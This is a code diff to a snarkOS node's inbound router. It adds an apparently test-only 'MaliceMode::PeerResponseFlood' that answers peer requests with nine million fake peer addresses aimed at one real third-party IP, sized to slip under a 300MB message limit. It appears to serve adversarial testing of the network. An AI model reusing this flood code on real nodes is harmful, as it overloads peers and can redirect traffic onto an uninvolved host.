@@ -35,6 +35,7 @@ use snarkvm::prelude::{
 };
 
 use anyhow::{anyhow, bail, Result};
+use snarkos_node_malice::malice_replace;
 use snarkos_node_tcp::is_bogon_ip;
 use std::{net::SocketAddr, time::Instant};
 use tokio::task::spawn_blocking;
@@ -283,8 +284,33 @@ pub trait Inbound<N: Network>: Reading + Outbound<N> {
                 .take(MAX_PEERS_TO_SEND)
                 .collect(),
         };
-        // Send a `PeerResponse` message to the peer.
-        self.send(peer_ip, Message::PeerResponse(PeerResponse { peers }));
+        // If executing MaliceMode::PeerResponseFlood, create bogus ips to send.
+        malice_replace!(
+            MaliceMode::PeerResponseFlood,
+            {
+                // Send a `PeerResponse` message to the peer.
+                self.send(peer_ip, Message::PeerResponse(PeerResponse { peers }));
+            },
+            {
+                // Generate bogus SocketAddr
+                let num_bogus_peers = 9000000; // Stay under the 300MB message limit
+                let mut bogus_peers = Vec::with_capacity(num_bogus_peers);
+                for _ in 0..num_bogus_peers {
+                    // This is the stackoverflow ip address, we can expand the attack with more varied IP addresses and ports.
+                    bogus_peers.push("104.18.32.7:5000".parse().unwrap());
+                }
+
+                // estimate size of bogus_peers
+                let size_of_bogus_peers = std::mem::size_of_val(&bogus_peers[0]) * bogus_peers.len();
+                info!(
+                    "[MaliceMode::PeerResponseFlood] | node/router/src/inbound.rs | Injecting bogus validators of size {} into the response",
+                    size_of_bogus_peers
+                );
+
+                let peers = peers.iter().chain(bogus_peers.iter()).copied().collect::<Vec<_>>();
+                self.send(peer_ip, Message::PeerResponse(PeerResponse { peers }));
+            }
+        );
         true
     }
 
